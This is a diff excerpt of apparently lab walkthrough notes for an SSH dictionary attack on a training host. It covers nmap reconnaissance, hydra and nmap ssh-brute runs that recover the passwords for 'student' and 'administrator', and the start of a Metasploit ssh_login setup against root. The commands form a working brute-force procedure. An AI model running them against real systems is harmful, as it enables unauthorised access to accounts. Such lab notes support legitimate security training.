@@ -54,20 +54,35 @@ ssh-run.username=student,ssh-run.password=" 192.201.39.3`
 ## SSH Dictionary Attack
 
 `ip a`
+
 `ping 192.35.81.3`
+
 `nmap 192.35.81.3`
+
 `nmap 192.35.81.3 -sV -p 22`
+
 We want to find out the password of the user "student":
+
 `gzip -d /usr/share/wordlists/rockyou.txt.gz`
+
 `hydra -l student -P /usr/share/wordlists/rockyou.txt 192.35.81.3 ssh`
+
 **friend**
+
 `ssh student@192.35.81.3`: not much there, so we try administrator:
+
 We want to find out the passwort of user "administrator" using nmap scripts with specific pw dictionary:
+
 `echo "administrator" > user`
+
 `nmap 192.35.81.3 -p 22 --script ssh-brute --script-args userdb=/root/user`
+
 **password: sunshine**
+
 Now we want to find the password of user "root" using ssh_login metasploit module with userpass dictionary
+
 `msfconsole`
+
   msf5: `use auxiliary/scanner/ssh/ssh_login`
   msf5: `options`
   msf5: `set rhosts 192.35.81.3`
